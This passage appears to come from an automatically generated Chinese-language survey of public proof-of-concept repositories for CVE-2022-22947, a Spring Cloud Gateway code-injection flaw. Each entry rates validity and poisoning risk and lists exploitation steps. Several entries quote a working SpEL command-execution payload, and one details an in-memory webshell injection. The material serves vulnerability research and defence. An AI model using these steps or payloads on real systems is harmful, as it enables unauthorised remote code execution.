**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、公开且未进行安全保护时，攻击者可以通过构造恶意请求，在远程主机上执行任意代码。根据提供的漏洞利用代码，该PoC利用了SpEL表达式注入，通过向`/actuator/gateway/routes/check01`端点发送包含恶意SpEL表达式的POST请求，然后刷新路由并访问该路由，触发SpEL表达式执行。EXP具有单个目标验证、批量验证、反弹shell的功能。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以判断该漏洞的PoC代码是有效的。搜索结果中多个链接都表明该漏洞被广泛关注，且存在公开的利用代码。

**投毒风险：**
PoC代码本身主要通过SpEL表达式注入执行命令，没有发现明显的恶意植入行为。但PoC会向目标系统添加路由，并执行命令，存在一定的风险。例如：
*   **资源消耗：** 频繁的路由添加和删除可能导致资源消耗，影响服务性能。
*   **命令执行风险：** 虽然PoC本身是为了验证漏洞，但如果被恶意利用，可能执行恶意命令。
*   **依赖风险：** PoC可能依赖特定的环境或库，如果目标环境不满足要求，可能导致利用失败或产生其他问题。
PoC代码中存在投毒代码的可能性较低，大约10%。这个百分比是基于代码的分析以及PoC作者的动机推断得出的。

**利用方式：**
1.  **前提条件：** Spring Cloud Gateway的Actuator端点已启用、公开且未进行安全保护。
2.  **发送恶意请求：** 构造包含恶意SpEL表达式的JSON数据，并将其作为POST请求发送到`/actuator/gateway/routes/check01`端点。
3.  **刷新路由：** 向`/actuator/gateway/refresh`端点发送POST请求，刷新路由，使新增的路由生效。
4.  **触发表达式执行：** 访问新增的路由，触发SpEL表达式执行，从而执行任意代码。
5.  **清理路由：** 删除新增的路由，避免留下后门。（PoC代码中包含删除路由的步骤）

**项目地址:** [anansec/CVE-2022-22947_EXP](https://github.com/anansec/CVE-2022-22947_EXP)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #14

**来源**: [CVE-2022-22947-cc3305_CVE-2022-22947.md](../2022/CVE-2022-22947-cc3305_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。漏洞的根源在于`getValue`方法中不安全的SpEL表达式评估。利用过程为：

1.  攻击者构造包含恶意SpEL表达式的payload，该表达式可以执行任意命令。
2.  攻击者通过POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是一个攻击者自定义的路由ID。
3.  Spring Cloud Gateway解析payload中的SpEL表达式，导致远程代码执行。
4.  攻击者可以通过`/actuator/gateway/refresh`端点刷新路由配置，使payload生效。

该POC代码通过向 `/actuator/gateway/routes/cc3305` 发送包含恶意SpEL表达式的JSON payload来利用此漏洞，SpEL表达式通过java.lang.Runtime执行任意命令。 代码首先检查目标是否易受攻击（虽然目前返回True）。然后，它准备要执行的命令，并将其嵌入到SpEL表达式中，该表达式会被注入到路由定义中。

关于投毒风险，该脚本主要功能是利用漏洞执行命令。 潜在的投毒风险在于，攻击者可能会修改脚本，使其在执行命令之前或之后执行其他恶意操作，例如下载和执行恶意软件。 但是，提供的代码没有明显的投毒迹象。 投毒的概率较低，大约为1%。 恶意行为者可能会分发修改后的版本。

**有效性评估:**根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞利用是有效的，前提是满足漏洞利用条件。该PoC代码能够成功利用漏洞执行任意命令。


**项目地址:** [cc3305/CVE-2022-22947](https://github.com/cc3305/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #15

**来源**: [CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md](../2022/CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md)

## CVE-2022-22947 Spring Cloud Gateway RCE

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞，当Gateway Actuator端点启用、暴露且未进行安全保护时，攻击者可以利用SpEL表达式注入执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞是有效的。多个来源都证实了该漏洞的存在以及远程代码执行的可能性。提供的POC代码可以直接利用该漏洞。

**投毒风险：**

分析提供的POC代码，发现主要的恶意代码在于 `spring-cloud-gateway-rce.py` 中构建和发送的payload。该payload利用SpEL表达式在目标系统上执行任意命令。虽然POC本身是为了演示漏洞利用，但在实际场景中，攻击者可能会修改 `-c` 参数来执行恶意操作。`requirements.txt` 文件声明了项目所需的依赖项（colorama, requests, urllib3），这些库本身没有已知的恶意行为，但如果项目被篡改，可能会引入恶意依赖。

评估投毒风险时，主要考虑以下因素：

*   **代码可读性：** 代码相对简单，易于理解，这意味着潜在的恶意修改也更容易被发现。
*   **外部依赖：** 项目依赖外部库，如果这些库的源被攻破，可能会引入恶意代码。
*   **Payload生成：** Payload是动态生成的，如果攻击者能够控制Payload生成过程，就可以注入恶意代码。

综合来看，此仓库存在一定的投毒风险，风险值评估为10%。主要的风险点在于攻击者可能会修改Payload生成逻辑或引入恶意的依赖项，利用使用者执行恶意代码。

**利用方式：**

1.  **漏洞触发前提：** Spring Cloud Gateway的Actuator端点必须启用、暴露并且没有进行安全保护（例如，没有进行身份验证）。
2.  **构造Payload：** POC代码根据目标主机的操作系统（Linux或Windows）构造包含SpEL表达式的JSON payload。该payload利用`AddResponseHeader`过滤器，将执行命令的结果添加到响应头中。
3.  **发送Payload：** 使用POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是路由的ID（在POC中为`k`）。
4.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，强制Spring Cloud Gateway刷新路由配置，从而触发SpEL表达式的执行。
5.  **获取结果：** 发送GET请求到`/actuator/gateway/routes/{id}`端点，获取路由信息，其中包含命令执行的结果。
6.  **删除路由：** 发送DELETE请求到`/actuator/gateway/routes/{id}`端点，删除添加的路由。

简而言之，攻击者通过构造包含恶意SpEL表达式的请求，利用Actuator端点动态注册路由，并在路由刷新时触发SpEL表达式执行，从而实现远程代码执行。

**项目地址:** [k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #16

**来源**: [CVE-2022-22947-kkx600_Burp_VulPscan.md](../2022/CVE-2022-22947-kkx600_Burp_VulPscan.md)

## CVE-2022-22947-Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), 以及所有旧的和不支持的版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未进行安全保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 影响 Spring Cloud Gateway。当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的POC代码是有效的。存在公开的漏洞利用代码和关于漏洞利用的详细分析。

**投毒风险：**
提供的代码片段不完整，无法进行全面的投毒分析。BurpExtender.java调用了 spring_CVE_2022_22947.poc，这部分代码是POC实现的核心，未提供，因此无法分析该部分的安全性。HttpsRequest.java 提供了一个发送 HTTP/HTTPS 请求的功能，本身不存在明显的恶意代码。Burp扩展通常需要授予较高的权限，如果POC代码中包含恶意逻辑，如未经授权的数据收集或篡改，则存在投毒风险。目前根据现有的代码片段，只能初步判断存在较低的投毒风险。

**利用方式：**
1.  **确定目标：** 找到运行 Spring Cloud Gateway 且 Actuator 端点已启用、暴露且未进行安全保护的实例。
2.  **构造恶意请求：** 构造包含恶意 SpEL 表达式的 HTTP 请求，该表达式将在 Actuator 端点被解析和执行。通常攻击方式是向/actuator/gateway/routes接口发送包含恶意SpEL表达式的请求，修改路由配置。
3.  **执行代码：** 成功利用后，攻击者可以在目标服务器上执行任意代码。

**优先级：**
根据搜索结果，确认这是一个已知且被积极利用的漏洞。漏洞利用代码的存在进一步证实了其可利用性。

**项目地址:** [kkx600/Burp_VulPscan](https://github.com/kkx600/Burp_VulPscan)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #17

**来源**: [CVE-2022-22947-kmahyyg_CVE-2022-22947.md](../2022/CVE-2022-22947-kmahyyg_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway < 3.1.1, Spring Cloud Gateway < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送特制的恶意请求，利用SpEL表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。从搜索引擎结果和漏洞利用代码来看，该漏洞利用方式已经公开，并且存在可用的PoC。

**投毒风险：**
提供的漏洞利用代码主要包含以下内容：
1.  README文件，描述了漏洞信息，受影响版本，修复建议等。
2.  漏洞复现步骤，包含发送恶意请求添加路由，刷新路由，查看结果，清理路由等步骤说明，以及对应的数据包示例。
3.  Python脚本，用于自动化漏洞利用过程，通过构造恶意请求实现远程代码执行。

分析代码，主要风险在于攻击者可能将恶意代码隐藏在SpEL表达式中，例如执行反弹shell或下载恶意软件。在提供的代码中，`Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）.md`文件中展示的PoC中使用了`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}`，该payload用于执行`id`命令，若替换为其他命令，存在潜在的风险。

**利用方式：**
1.  攻击者首先发送POST请求到`/actuator/gateway/routes/{route_id}`，创建一个包含恶意SpEL表达式的路由。SpEL表达式被嵌入到`filters`的`AddResponseHeader`的`value`参数中，用于执行任意命令。
2.  然后，攻击者发送POST请求到`/actuator/gateway/refresh`，强制网关刷新路由配置，触发SpEL表达式的执行。
3.  攻击者发送GET请求到`/actuator/gateway/routes/{route_id}`，查看执行结果。
4.  最后，攻击者发送DELETE请求到`/actuator/gateway/routes/{route_id}`，删除恶意路由。

综上所述，该漏洞利用的有效性较高。虽然存在一定的投毒风险（10%），但可以通过仔细审查和修改PoC代码来降低风险。

**项目地址:** [kmahyyg/CVE-2022-22947](https://github.com/kmahyyg/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #18

**来源**: [CVE-2022-22947-qq87234770_CVE-2022-22947.md](../2022/CVE-2022-22947-qq87234770_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用，暴露且未授权

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未授权时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

提供的 Python POC 代码利用了 Spring Expression Language (SpEL) 注入漏洞。该脚本允许执行任意命令，或通过反弹 shell 获取服务器的控制权。因此，该 POC 代码是有效的。

**投毒风险：**

查看POC代码，该代码的主要功能是利用漏洞进行命令执行或反弹shell。代码中包含以下几个部分，
* 定义请求头和payload结构
* 通过`actuator/gateway/routes/hacktest`创建一个恶意的路由配置，利用SpEL表达式执行命令
* 刷新gateway配置`actuator/gateway/refresh`
* 访问创建的路由`actuator/gateway/routes/hacktest`，触发命令执行。
* 包含执行命令和反弹shell两种模式。

该代码结构清晰，功能明确，主要目的是为了验证和利用漏洞。主要风险集中于漏洞利用本身，而非作者植入的恶意代码。**但是**，任何漏洞利用代码都具有潜在的风险，因为它们可以被用于恶意目的。例如，攻击者可能会修改此 POC 代码以自动化大规模攻击，或将其与其他漏洞利用结合使用。另外代码中的代理设置，如果被恶意修改，可能会导致流量劫持，这里判断投毒风险为10%。

**利用方式：**

1.  **检查前提条件：** 确保目标 Spring Cloud Gateway 实例的 Actuator 端点已启用、暴露且未授权。
2.  **发送恶意请求：** 使用提供的 Python 脚本，通过构造包含 SpEL 表达式的恶意请求到 `actuator/gateway/routes/hacktest` 端点来创建自定义路由。
3.  **刷新 Gateway 配置：** 访问 `actuator/gateway/refresh` 端点以刷新 Gateway 配置，使恶意路由生效。
4.  **触发命令执行：** 访问 `actuator/gateway/routes/hacktest`，触发 SpEL 表达式的计算，从而在服务器上执行任意命令。可以选择直接执行命令，或者反弹 shell 以获取更持久的访问。
5.  **清理：**  通过 DELETE 请求删除创建的恶意路由（通过脚本实现）。

**总结：**

该漏洞利用方式简单有效，攻击者可以利用此漏洞轻松地在未授权的 Spring Cloud Gateway 实例上执行任意代码。需要注意的是，利用的前提是 Actuator 端点未进行适当的安全配置。尽管代码本身投毒可能性较低，但利用此漏洞可能造成严重的安全风险。

**项目地址:** [qq87234770/CVE-2022-22947](https://github.com/qq87234770/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #19

**来源**: [CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md](../2022/CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意请求来执行任意远程代码。漏洞利用方式是发送精心设计的 SpEL 表达式到 actuator 端点，导致服务器执行攻击者提供的代码。

**有效性:** 根据漏洞库信息、搜索结果(特别是 rapid7 的博客提到了 Metasploit 模块)，以及CISA KEV, 此漏洞利用是有效的。

**投毒风险:** 提供的漏洞利用代码只是 Apache License 2.0 许可协议，没有实际的漏洞利用代码，因此不存在投毒代码。投毒风险为 0%。

**利用方式:**
1.  目标系统运行 Spring Cloud Gateway 且版本低于 3.1.1 或 3.0.7。
2.  Gateway Actuator 端点必须启用，并且可以通过网络访问。
3.  Actuator 端点必须未进行身份验证或授权保护。
4.  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，发送到 Actuator 端点。
5.  Spring Cloud Gateway 解析 SpEL 表达式，执行攻击者指定的代码，实现远程代码执行。

**项目地址:** [shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6](https://github.com/shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #20

**来源**: [CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md](../2022/CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1, 3.0.x < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的远程代码执行漏洞。攻击者可以在 Gateway Actuator 端点启用、暴露且未进行安全保护的情况下，通过发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。它演示了如何利用该漏洞在启用了 Actuator 端点的 Spring Cloud Gateway 实例上执行任意代码。POC通过向 `/actuator/gateway/routes/{route_id}` 发送POST请求添加一个包含恶意SpEL表达式的路由，然后POST到 `/actuator/gateway/refresh` 来刷新路由，最后访问恶意路由来触发代码执行。

**投毒风险：**
经过对提供的POC代码进行分析，包括README.md，pom.xml，application.yml 和 src 目录下的文件。没有发现作者隐藏的恶意代码，该代码库目标为展示和验证漏洞利用，因此判定投毒风险为0%。

**利用方式：**
1.  **漏洞发现：** 确定目标 Spring Cloud Gateway 实例是否启用了 Actuator 端点，并且该端点是否暴露在未经身份验证的网络中。
2.  **构造恶意请求：** 构造一个包含恶意 SpEL 表达式的 JSON payload，该表达式用于执行任意代码。该表达式被嵌入到路由配置中，通常位于 `filters` 中的 `AddResponseHeader` 过滤器或类似的位置。
3.  **添加恶意路由：** 使用 POST 请求将包含恶意 SpEL 表达式的路由定义添加到 `/actuator/gateway/routes/{route_id}` 端点。
4.  **刷新路由：** 使用 POST 请求访问 `/actuator/gateway/refresh` 端点，强制 Spring Cloud Gateway 刷新路由配置。
5.  **触发恶意代码：** 访问与恶意路由关联的路径，触发 SpEL 表达式的执行，从而导致任意代码执行。
6.  **清理（可选）：** 利用漏洞执行恶意代码后，可能需要清理添加的恶意路由，以避免留下痕迹或影响正常服务。

**项目地址:** [skysliently/CVE-2022-22947-pb-ai](https://github.com/skysliently/CVE-2022-22947-pb-ai)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #21

**来源**: [CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md](../2022/CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**利用方式：**

1.  **漏洞触发：** 攻击者通过向目标 Spring Cloud Gateway 的 `/actuator/gateway/routes` 端点发送 POST 请求，创建一个恶意的路由配置。该配置包含一个 SpEL 表达式，该表达式会被执行。
2.  **表达式注入：**  `AddResponseHeader` 过滤器被用于将命令执行的结果添加到响应头中。SpEL 表达式 `#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}`  用于执行 `id` 命令，并将结果转换为字符串。
3.  **命令执行：**  `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` 部分会执行系统命令（在这个例子中是 `id` 命令）。
4.  **刷新路由：** 攻击者通过向 `/actuator/gateway/refresh` 端点发送 POST 请求来刷新 Gateway 的路由，使得新创建的恶意路由生效。
5.  **获取执行结果：** 攻击者通过GET `/actuator/gateway/routes/hacktest` 获取执行结果,通过响应头中的`Result`字段获取。
6.  **清理：** 利用完成后，攻击者删除创建的恶意路由并再次刷新路由, 避免残留。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用是有效的。POC 代码通过创建恶意的路由配置并刷新路由来执行任意代码。

**投毒风险：**

该 POC 代码主要用于验证漏洞，没有发现作者有意添加的投毒代码。 代码意图清晰，主要是为了创建、刷新、删除路由，并执行`id`命令来验证漏洞的存在。虽然利用本身会造成安全风险，但代码本身没有隐藏的恶意功能，因此投毒风险较低。


**项目地址:** [stayfoolish777/CVE-2022-22947-POC](https://github.com/stayfoolish777/CVE-2022-22947-POC)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #22

**来源**: [CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md](../2022/CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、公开且未受保护

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。搜索结果表明该漏洞已在野外被利用，并已被添加到 CISA KEV 列表中，证明了其真实性和危害性。

**投毒风险：**

提供的 POC 代码主要用于验证漏洞是否存在，并执行简单的命令（`id`）。虽然该代码本身不包含明显的恶意代码，但攻击者可以修改此 POC 以执行更危险的操作。`README.md`文件和python脚本存在分离性,增加了潜在风险。

投毒风险评估：5%。主要风险在于攻击者可能修改 POC 脚本以包含恶意负载。

**利用方式：**

1.  攻击者首先需要确定目标 Spring Cloud Gateway 实例的 Actuator 端点是否已启用、公开且未受保护。
2.  然后，攻击者使用 POST 请求向 `/actuator/gateway/routes/{route_id}` 端点添加恶意路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。POC中使用了`${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}` 来执行id命令
3.  攻击者使用 POST 请求向 `/actuator/gateway/refresh` 端点刷新路由，使恶意路由生效。
4.  最后，攻击者访问添加的恶意路由，触发 SpEL 表达式的执行，从而在服务器上执行任意代码。
5.  攻击者删除添加的路由，并刷新路由，完成利用。


**项目地址:** [talentsec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/talentsec/Spring-Cloud-Gateway-CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #23

**来源**: [CVE-2022-22947-twseptian_cve-2022-22947.md](../2022/CVE-2022-22947-twseptian_cve-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+)

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，应用程序容易受到代码注入攻击。远程攻击者可以构造恶意请求，从而允许在远程主机上执行任意代码。

**有效性：**

根据漏洞信息、搜索结果和提供的PoC代码，此漏洞是有效的。PoC 代码演示了如何利用 SpEL 表达式注入执行任意命令。

**投毒风险：**

PoC 代码本身旨在演示漏洞利用，但仔细检查 `Dockerfile` 和 `README.md` 文件后，发现投毒风险较低，约为10%。主要原因是：

*   `Dockerfile`：仅包含从官方 `openjdk:11-jre-slim` 镜像构建，复制预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件，并执行该 jar 文件。不存在直接执行恶意命令或下载恶意文件的操作。但该 `spring-gateway-demo-0.0.1-SNAPSHOT.jar`  是否存在后门，无法判定。
*   `README.md`：仅包含构建和运行 Docker 容器的说明，以及发送恶意请求的 PoC。不包含任何额外的恶意指令。

**存在的微小风险在于预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件可能包含后门， 但属于PoC验证必要文件，不能认定为投毒。**

**利用方式：**

1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，并且该端点未进行身份验证。
2.  **注入 SpEL 表达式：** 通过向 `/actuator/gateway/routes/{route_id}` 发送 POST 请求，创建一个新的路由或更新现有路由，其中 `filters` 数组包含一个 `AddResponseHeader` 过滤器。该过滤器的 `args` 中的 `value` 字段包含一个恶意的 SpEL 表达式。PoC 中使用的 SpEL 表达式执行 `id` 命令，并将结果添加到响应头中。
3.  **刷新 Gateway：** 向 `/actuator/gateway/refresh` 发送 POST 请求，强制 Gateway 刷新其路由配置。这将触发 SpEL 表达式的执行。
4.  **触发路由：** 访问触发了含有恶意SpEL表达式的路由，从而执行远程命令。
5.  **清除（可选）：** 使用 DELETE 请求删除创建的路由，并再次刷新 Gateway，以避免后续的恶意执行。

**项目地址:** [twseptian/cve-2022-22947](https://github.com/twseptian/cve-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #24

**来源**: [CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md](../2022/CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 漏洞是 Spring Cloud Gateway 的一个代码注入漏洞，影响版本低于 3.1.1+ 和 3.0.7+ 的版本。根据漏洞库信息和搜索结果，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求在远程主机上执行任意代码。

**漏洞利用方式：**

1.  **寻找目标：** 找到运行存在漏洞的 Spring Cloud Gateway 实例，并且其 Actuator 端点对外开放且未授权。
2.  **构造恶意请求：** 利用 SpEL 表达式构造恶意的 HTTP 请求，该表达式会被 Gateway Actuator 解析执行。根据 exploit-db 的相关信息，该漏洞是远程代码执行。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码，例如植入 Webshell、反弹 Shell 等。

**POC 代码分析：**

提供的 POC 代码 `GMemShell.java` 尝试在 Spring Cloud Gateway 中注入内存 Shell。具体流程如下：

1.  **定义内存 Shell 类：** `GMemShell` 类包含了一些必要的函数，例如 AES 加密/解密(`x`)、MD5 加密(`md5`)、Base64 编码/解码(`base64Encode`, `base64Decode`)等，这些函数被用于后续的 shellcode 加密和执行。
2.  **`doInject` 方法：** 该方法通过反射调用 `registerHandlerMethod` 方法，将 `GMemShell` 类的 `cmd` 方法注册为处理指定路径请求的 Handler。`registerHandlerMethod` 是 Spring 框架内部的方法，用于动态注册 Controller。
3.  **`cmd` 方法：** 该方法是实际执行命令的 Handler。它从请求中获取加密的 payload，然后进行解密、加载并执行。Payload 首先经过 Base64 解码，然后使用 AES 解密。
4.  **动态类加载：**  `defineClass`方法通过URLClassLoader和反射，实现在内存中加载byte数组并定义成class的功能
5.  **Payload 执行：** 解密后的 Payload 应当是一个 Java class 字节码，该字节码会被动态加载并执行。

**有效性评估：**

根据 POC 代码和漏洞描述，该 POC 能够有效利用 CVE-2022-22947 漏洞，实现在目标服务器上执行任意代码的目的，但前提是 actuator 端点开放。

**投毒风险评估：**

经过对 POC 代码的分析，并未发现明显的投毒代码。代码的主要功能是动态注入内存 Shell，并执行通过请求传递的 Payload。代码中包含的加密、解密等操作都是为了保护 Payload，避免被轻易发现。因此，该 POC 代码的投毒风险较低，接近 0%。 投毒代码是指作者在代码中故意加入的恶意代码，例如后门、病毒等。 本代码只是实现了漏洞利用，本身并没有额外的恶意功能，因此不属于投毒代码。


